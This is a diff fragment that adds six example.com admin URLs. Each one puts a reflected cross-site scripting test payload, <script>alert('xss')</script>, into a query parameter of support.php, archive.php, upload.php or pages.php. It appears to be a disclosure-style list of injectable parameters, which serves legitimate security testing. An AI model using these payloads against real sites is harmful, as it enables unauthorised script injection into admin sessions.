@@ -1,0 +1,6 @@
+http://www.example.com/admin/support.php?success=&lt;script&gt;alert('xss');&lt;/script&gt;
+http://www.example.com/admin/archive.php?upd=del-success&id=&lt;script&gt;alert('xss');&lt;/script&gt;
+http://www.example.com/admin/upload.php?upd=del-success&id=&lt;script&gt;alert('xss');&lt;/script&gt;
+http://www.example.com/admin/pages.php?error=&lt;script&gt;alert('xss');&lt;/script&gt;
+http://www.example.com/admin/pages.php?upd=edit-success&id=&lt;script&gt;alert('xss');&lt;/script&gt;&type=delete
+http://www.example.com/admin/pages.php?upd=edit-err&type=&lt;script&gt;alert('xss');&lt;/script&gt;
